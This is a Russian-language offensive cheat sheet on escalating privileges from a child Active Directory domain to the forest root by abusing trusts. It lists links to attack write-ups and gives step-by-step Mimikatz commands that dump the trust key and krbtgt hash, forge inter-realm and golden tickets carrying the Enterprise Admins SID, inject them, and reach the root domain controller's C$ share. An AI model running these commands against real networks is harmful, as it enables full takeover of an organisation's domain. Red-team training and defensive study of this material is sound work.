# Через механизм доверия (Trusts)

## Intro

Домены в одном forest имеют внутреннее двунаправленное доверие с forest root. Существует trust key между родительскими и дочерними доменами. Существует два способа повысить привилегии между доменами в одном forest:

* krbtgt hash
* trust tickets

### More on trusts

Как атаковать Trust'ы

* [It’s All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts](https://adsecurity.org/?p=1588)
* [A Guide to Attacking Domain Trusts](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
* [Active Directory forest trusts part 1 - How does SID filtering work?](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/)
* [Inter-Realm Key Roasting (well… within the first 30 days)](https://blog.xpnsec.com/inter-realm-key-roasting/)
* [Not A Security Boundary: Breaking Forest Trusts](http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)

## Examples: От дочернего домена до forest root&#x20;

### Используя Trust Tickets

Для подделки Trust Tickets необходим Trust Key:

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
```

Inter-realm TGT может быть подделан следующим образом:

```
Invoke-Mimikatz -Command '"Kerberos::golden /domain:my.domain.local /sid:S-1-5-21-1330458198-3714148463-1088246548 /sids:S-1-5-21-1330458198-3714148463-1088246548-519 /rc4:3003d6dcb0df0dcaa9ead774e1ac14ef /user:Administrator /service:krbtgt /target:some.local /ticket:C:\Users\Administrator\Desktop\trust_tkt.kirbi"'
```

Получаем TGS для сервиса (ниже к CIFS) в интересующем домене, используя подделаный Trust Ticket.

```
.\asktgs.exe C:\Users\Administrator\Desktop\trust_tkt.kirbi CIFS/ps-dc.somedomain.local
```

Тикеты для других сервисов (например, HOST и RPCSS для WMI, HOST и HTTP для PowerShell Remoting and WinRM), могут быть созданы так же.

Используем TGS для доступа к интересующему сервису:

```
.\kirbikator.exe lsa .\CIFS.ps-dc.somedomain.local.kirbi 
ls \\ps-dc.somedomain.local\c$
```

### Используя krbtgt hash

Получаем историю SID

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"‘
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:my.domain.local /sid:S-1-5-21-1330458198-3714148463-1088246548 /krbtgt:3003d6dcb0df0dcaa9ead774e1ac14ef /sids:S-1-5-21-257853-8781-3714148463-1088246548-519 /ticket:krb_tkt.kirbi"‘
```

На машине в домене my.domain.local:

```
Invoke-Mimikatz -Command '"kerberos::ptt C:\test\krb_tkt.kirbi"'
```

Теперь мы имеем привилегии Enterprise Admin:

```
ls //ps-dc.my.domain.local/C$
```
